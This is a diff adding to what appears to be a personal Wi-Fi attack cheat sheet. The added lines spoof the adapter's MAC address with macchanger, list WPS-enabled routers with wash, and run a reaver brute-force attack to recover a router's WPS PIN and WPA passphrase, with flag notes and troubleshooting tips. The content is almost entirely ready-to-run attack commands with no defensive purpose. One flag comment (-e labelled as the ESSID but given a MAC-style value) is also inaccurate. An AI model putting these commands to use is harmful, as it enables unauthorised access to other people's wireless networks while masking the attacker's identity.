@@ -207,6 +207,32 @@ sudo aireplay-ng --fakeaut 0 -e "My Wifi name" -a 00:01:02:03:04:05 wlan1mon	# B
 	# Example: <length:   9>
 
 
+# Mask your MAC
+###############
+ifconfig wlan1mon down
+macchanger -a wlan1mon
+ifconfig wlan1mon up
+
+
+# Find only routers that have WPS enabled
+#########################################
+wash -i wlan1mon
+	# Note the channel, BSSID (MAC) and ESSID (wifi name)
+
+# Run the WPS attack
+####################
+reaver -i wlan1mon -c 6 -e 00:00:00:00:00:00 -b 11:11:11:11:11:11 -vv
+	# -i	# Wireless monitor interface/adapter
+	# -c 6	# The router's channel (using 6 for example)
+	# -e	# The wifi name/ESSID
+	# -b	# The wifi MAc address/BSSID
+	# -vv	# 
+# If you're getting an "[!] Found packet with bad FCS, skipping..." error you can append "--ignore-fcs" to the end of the command
+# Attacks can be paused (need to look up the command though)
+# Make note of the "WPS PIN" and "WPA PSK" when complete
+
+
+
 # SYN SCAN DETECTION
 ####################
 
